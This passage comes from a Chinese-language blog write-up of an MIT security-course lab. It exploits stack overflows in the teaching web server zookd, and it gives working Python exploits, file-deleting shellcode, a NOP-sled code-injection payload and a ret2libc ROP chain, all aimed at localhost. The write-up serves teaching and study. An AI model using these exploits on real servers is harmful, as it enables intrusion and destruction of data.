class="hljs-string">&#x27;:&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (3)&quot;</span>;<br>*colon = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br><span class="hljs-comment">/* Set the header name to uppercase and replace hyphens with underscores */</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(buf); i++) &#123;<br>    buf[i] = <span class="hljs-built_in">toupper</span>(buf[i]);<br>    <span class="hljs-keyword">if</span> (buf[i] == <span class="hljs-string">&#x27;-&#x27;</span>)<br>        buf[i] = <span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">/* Decode URL escape sequences in the value */</span><br>url_decode(value, sp);<br></code></pre></td></tr></table></figure><p>最后部分就是如果 <code>key</code> 不为 <code>CONTENT_TYPE</code> 或 <code>CONTENT_LENGTH</code> 则在前面加上字符串 <code>HTTP_</code> 后存储到 <code>envvar</code> 中，并调用 <code>setenv()</code> 设置  <em>环境变量</em>  中的对应值</p><ul><li>这里我们注意到 <code>envvar</code> 也是一个<strong>位于函数栈上的长度仅为 512的字符数组</strong>，因此在这里也可以发生<strong>栈溢出</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">        <span class="hljs-comment">/* Store header in env. variable for application code */</span><br>        <span class="hljs-comment">/* Some special headers don&#x27;t use the HTTP_ prefix. */</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_TYPE&quot;</span>) != <span class="hljs-number">0</span> &amp;&amp;<br>            <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_LENGTH&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">sprintf</span>(envvar, <span class="hljs-string">&quot;HTTP_%s&quot;</span>, buf);<br>            setenv(envvar, value, <span class="hljs-number">1</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            setenv(buf, value, <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么下面我们来到 Exercise2，写一个 exp 来让 zookd 程序 crash 掉：</p><blockquote><p><strong>Exercise 2.</strong> Write an exploit that uses a buffer overflow to crash the web server (or one of the processes it creates). You do not need to inject code at this point. Verify that your exploit crashes the server by checking the last few lines of <code>dmesg | tail</code>, using <code>gdb</code>, or observing that the web server crashes (i.e., it will print <code>Child process 9999 terminated incorrectly, receiving signal 11</code>)</p><p>Provide the code for the exploit in a file called <code>exploit-2.py</code>.</p><p>The vulnerability you found in Exercise 1 may be too hard to exploit. Feel free to find and exploit a different vulnerability.</p></blockquote><p>我们现在来测试一下这个漏洞，首先编写一个正常的 HTTP Get 请求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">host, port</span>):<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((host, <span class="hljs-built_in">int</span>(port)))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + <span class="hljs-string">b&quot;rat3bant&quot;</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: &#123;&#125; host port&quot;</span>.<span class="hljs-built_in">format</span>(sys.argv[<span class="hljs-number">0</span>]))<br>        exit(-<span class="hljs-number">1</span>)<br>    exp(sys.argv[<span class="hljs-number">1</span>], sys.argv[<span class="hljs-number">2</span>])<br></code></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://s2.loli.net/2022/11/29/PujgG7EJVMmOiz1.png" alt="image.png"></p><p>接下来我们尝试利用 <code>envvar</code> 进行溢出测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + <span class="hljs-string">b&quot;rat3bant&quot;</span> * <span class="hljs-number">512</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>可以看到 zookd 提示了子进程收到了 <code>signal 11</code>（也就是 <code>SIGSEGV</code>），同时我们收到的响应也为空字符串，说明我们成功触发了这个漏洞</p><p><img src="https://s2.loli.net/2022/12/03/oWwStCVeFG5Qd6Z.png" alt="image.png"></p><blockquote><p>MIT 其实还贴心地提供了一个 <code>exploit-template.py</code> 文件，让笔者这种不怎么会用 socket 写裸 HTTP 请求的菜鸡可以参考（笑），<s>他真的👴哭死</s></p></blockquote><p>将文件名改成 <code>exploit-2.py</code> 后我们可以使用如下命令进行评测：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-crash</span><br></code></pre></td></tr></table></figure><p>评测的原理是检查 <code>/tmp/strace.log</code> 当中是否有 <code>SIGSEGV</code> 字符串，笔者也不知道为什么反正笔者电脑上没有这个文件，所以这里就跳过了（<s>👴的评价是🔈↑↓</s>）</p><blockquote><p>但是比较 SB 的是评测用的是 MIT 编译的 zookd 而不是我们自行编译的，然后他就会给👴报这种SB错误：</p><p><img src="https://s2.loli.net/2022/11/29/Fs1Ka4xTNtWXPrq.png" alt="image.png"></p><p>然后👴自己再重新试着跑 zookd 会发现，<s>因为👴的学生🐓是老旧的 Ubuntu20，👴的评价是🔈↑↓</s>：</p><p><img src="https://s2.loli.net/2022/11/29/uBRnHQ4lMjfwLrU.png" alt="image.png"></p><p>最后笔者的解决方案是拉了一个 Ubuntu 22.04 的容器在里面做…</p></blockquote><h2 id="Part-2-Code-injection">Part 2: Code injection</h2><p>这一部分主要是让我们进行代码注入来删掉服务器上的 <code>/home/student/grades.txt</code> 文件（自己创一个就行），要求我们使用栈具有可执行权限的 <code>zookd-exstack</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd-exstack 8080</span><br></code></pre></td></tr></table></figure><p>实验还为我们提供了一份 shellcode 模板 <code>shellcode.S</code>，当我们 <code>make</code> 的时候其会被编译成 <code>shellcode.bin</code>，我们可以使用 <code>run-shellcode</code> 来验证其功能性：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./run-shellcode shellcode.bin</span><br></code></pre></td></tr></table></figure><p>接下来是 Exercise3，修改 shellcode 使其能删除  <code>/home/student/grades.txt</code>：</p><blockquote><p><strong>Exercise 3 (warm-up).</strong> Modify <code>shellcode.S</code> to unlink <code>/home/student/grades.txt</code>. Your assembly code can either invoke the <code>SYS_unlink</code> system call, or call the <code>unlink()</code> library function.</p></blockquote><p>里边是<s>丑陋的</s> AT&amp;T 汇编，笔者选择直接重写一份：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.globl main<br>.typemain, @function<br><br> main:<br>/* store the string on the stack */<br>xorq  %rax, %rax<br>pushq %rax<br>movq  $0x7478742e73656461, %rax /* &quot;ades.txt&quot; */<br>pushq %rax<br>movq  $0x72672f746e656475, %rax /* &quot;udent/gr&quot; */<br>pushq %rax<br>movq  $0x74732f656d6f682f, %rax /* &quot;/home/st&quot; */<br>pushq %rax<br><br>/* unlink(rsp) */<br>pushq %rsp<br>popq  %rdi<br>movq  $87, %rax /* SYS_unlink */<br>syscall<br><br>/* exit() */<br>xorq  %rdi, %rdi<br>movq  $60, %rax/* SYS_exit */<br>syscall<br><br></code></pre></td></tr></table></figure><p>成功删除文件：</p><p><img src="https://s2.loli.net/2022/12/03/FX8UsCbyW72fOtw.png" alt="image.png"></p><p>之后实验文件提示我们可以使用 strace 来跟踪 zookd 所使用的系统调用（需要root）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">strace -f -p $(pgrep zookd-)</span><br></code></pre></td></tr></table></figure><p>比如说笔者先起一个 zookd 再运行 strace，之后用前面的 exp 打一下 zookd 就可以看到：</p><p><img src="https://s2.loli.net/2022/12/03/oKDm5yIjCin6OpG.png" alt="image.png"></p><p>前面的评测应该是基于这个完成的，但是笔者发现在 <code>/tmp/strace.log</code> 当中不会记录 <code>SIGSEGV</code> 字符串，<s>👴也不知道为什么所以这里就先⑧管了</s></p><p><img src="https://s2.loli.net/2022/12/03/GkpjiZWb71HyhD3.png" alt="image.png"></p><p>以及我们也可以使用 gdb 进行调试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gdb -p $(pgrep zookd-)</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/03/M8HgfPEkdl2Vypi.png" alt="image.png"></p><p>之后实验手册扯了一堆怎么调试，这里就不管了，下面来看 Exercise 4，大概是让我们用 ret2shellcode 来打 zookd</p><blockquote><p><strong>Exercise 4.</strong> Starting from one of your exploits from Exercise 2, construct an exploit that hijacks the control flow of the web server and unlinks <code>/home/student/grades.txt</code>. Save this exploit in a file called <code>exploit-4.py</code>.</p><p>Verify that your exploit works; you will need to re-create <code>/home/student/grades.txt</code> after each successful exploit run.</p><p>Suggestion: first focus on obtaining control of the program counter. Sketch out the stack layout that you expect the program to have at the point when you overflow the buffer, and use <code>gdb</code> to verify that your overflow data ends up where you expect it to. Step through the execution of the function to the return instruction to make sure you can control what address the program returns to. The <code>next</code>, <code>stepi</code>, and <a href="https://visualgdb.com/gdbreference/commands/x"><code>x</code></a> commands in <code>gdb</code> should prove helpful.</p><p>Once you can reliably hijack the control flow of the program, find a suitable address that will contain the code you want to execute, and focus on placing the correct code at that address—e.g. a derivative of the provided shell code.</p></blockquote><p>因为没有开 ASLR 而且栈具有可执行权限，那么笔者直接用 <code>nop</code> 作为 slide code 并在栈上靠后的位置布置 shellcode 即可，这里注意别忘了把 shellcode 当中的 <code>\x00</code> 编码成 <code>%00</code> 否则会被过滤掉</p><blockquote><p>编写 shellcode 是 pwn 手最基础的技能，如果你不会的话…  ：）</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode_text = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* push string */</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x7478742e73656461</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x72672f746e656475</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x74732f656d6f682f</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* print the string */</span><br><span class="hljs-string">    mov rdx, 25</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* remove the file */</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    mov rax, 87</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* exit normally */</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    mov rax, 60</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    shellcode = asm(<span class="hljs-string">&#x27;nop&#x27;</span>) * <span class="hljs-number">4096</span> + asm(shellcode_text)<br>    payload = (p64(<span class="hljs-number">0x7fffffffe000</span>) * <span class="hljs-number">128</span> + shellcode).replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(req)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>笔者编写的 shellcode 当中有 <code>exit(0)</code> 所以不会报 SIGSEGV，但是有个打印字符串的操作让我们可以直观地看到代码执行成功，如果你想看 SIGSEGV 也可以把最后的 exit 代码去掉：）</p><p><img src="https://s2.loli.net/2022/12/03/2BrKMLp4vlESICT.png" alt="image.png"></p><p>使用如下命令进行测评：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-exstack</span><br></code></pre></td></tr></table></figure><p>通过</p><p><img src="https://s2.loli.net/2022/12/03/AkztJ2qahmWZuOo.png" alt="image.png"></p><h2 id="Part-3-Return-to-libc-attacks">Part 3: Return-to-libc attacks</h2><p>接下来终于到了<s>大一小朋友都会的</s> ret2libc 攻击的部分，这一次我们需要使用栈不具有可执行权限的 <code>zookd-nxstack</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd-nxstack 8080</span><br></code></pre></td></tr></table></figure><p><strong>返回导向编程</strong>（return-oriented programming， <strong>ROP</strong>）是用来突破包括 ASLR、栈不可执行保护在内的最为经典的攻击手法，<s>你要是不会👴也⑧教你，自己学去</s>，<code>ret2libc</code> 指的则是利用 libc 中的 gadget 来完成 ROP chain 的构建</p><p>实验手册中间的一堆介绍和说明直接跳了，<s>没啥意思</s>，接下来我们大踏步进入 Exercise 5：用 <code>ret2libc</code> 这一攻击手法来完成对 zookd 的攻击</p><blockquote><p><strong>Exercise 5.</strong> Starting from your exploit in Exercises 2 and 4, construct an exploit that unlinks <code>/home/student/grades.txt</code> when run on the binaries that have a non-executable stack. Name this new exploit <code>exploit-5.py</code>.</p><p>In this attack you are going to take control of the server over the network <em>without injecting any code</em> into the server. You should use a return-to-libc attack where you redirect control flow to code that already existed before your attack. The outline of the attack is to perform a buffer overflow that:</p><ol><li>causes the argument to the chosen libc function to be on stack</li><li>then causes <code>accidentally</code> to run so that argument ends up in <code>%rdi</code></li><li>and then causes <code>accidentally</code> to return to the chosen libc function</li></ol><p>It will be helpful to draw a stack diagram like the figures in <a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the Stack in the 21st Century</a> at (1) the point that the buffer overflows and (2) at the point that <code>accidentally</code> runs.</p></blockquote><p>首先 <code>checksec</code> ，除了 canary 以外的保护都开了…</p><p><img src="https://s2.loli.net/2022/12/03/M5TCnY6tDLNB2Fa.png" alt="image.png"></p><p>开了 PIE 比较难弄，虽然我们可以利用 partial overwrite 的方式来在 text 段的同一张页面上进行一次跳转，不过我们还不知道我们的参数到 <code>http_request_headers()</code> 栈底间的距离</p><p>信息泄露这一步比较难弄，于是笔者看了看其他人的做法，发现<strong>大家都是直接用 gdb 看程序以及 libc 的基址…</strong>（~~👴寻思这①丶也⑧实战啊，~~估计是为了教学目的降低了难度）</p><blockquote><p>笔者想了大半天怎么构建 ROP、怎么泄露 libc 地址、逆了半天程序找可用的 gadget，最后才知道这个实验是直接用 gdb 查看程序代码段+libc 的地址…<s>挺无语的其实</s></p></blockquote><p>那笔者只好也这么做了（笑），虽然说他提供了一个莫名其妙的 <code>accidentially()</code> 函数但是笔者选择直接忽略，随便找程序中的一个 <code>ret</code> 构造滑板后面跟 ROP 链即可，因为这个 Exercise 说实话做起来莫名其妙的所以笔者也用莫名其妙的解法好了（笑），这里配合 ROPgadget 找了一些 gadget 随便凑了一个可用的 ROP chain：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_malicious_request</span>():<br>    e = ELF(<span class="hljs-string">&#x27;./zookd-nxstack&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    libc_base = <span class="hljs-number">0x1555552e8000</span><br>    <br>    pop_rdi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()<br>    pop_rdx_pop_rbx_ret = libc_base + <span class="hljs-number">0x11f497</span> <span class="hljs-comment"># &#x27;pop rdx ; ret&#x27; by search can&#x27;t be used</span><br>    pop_rcx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rcx ; ret&#x27;</span>)).__next__()<br>    ret = pop_rdi_ret + <span class="hljs-number">1</span><br>    copy_gadget = libc_base + <span class="hljs-number">0xc5163</span> <span class="hljs-comment"># mov qword ptr [rax + rdx - 8], rdi ; ret</span><br>    push_rax_pop_rbx_ret = libc_base + <span class="hljs-number">0x1750eb</span><br>    mov_rdi_rbx_call_rcx = libc_base + <span class="hljs-number">0x15e9d8</span><br>    <br>    func_malloc = libc_base + libc.sym[<span class="hljs-string">&#x27;malloc&#x27;</span>]<br>    func_unlink = libc_base + libc.sym[<span class="hljs-string">&#x27;unlink&#x27;</span>]<br><br>    <span class="hljs-comment"># ret for slide</span><br>    payload  = <span class="hljs-number">512</span> * p64(ret)<br>    <span class="hljs-comment"># alloc a chunk to store the string</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x100</span>) + p64(func_malloc)<br>    <span class="hljs-comment"># copy string to chunk</span><br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x8</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x74732f656d6f682f</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x72672f746e656475</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x7478742e73656461</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x20</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(copy_gadget)<br>    <span class="hljs-comment"># call unlink(chunk)</span><br>    payload += p64(pop_rcx_ret) + p64(func_unlink)<br>    payload += p64(push_rax_pop_rbx_ret)<br>    payload += p64(mov_rdi_rbx_call_rcx)<br><br>    <span class="hljs-comment"># url encoding</span><br>    payload = payload.replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br><br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br><br>    <span class="hljs-keyword">return</span> req<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br>    sock.send(get_malicious_request())<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span 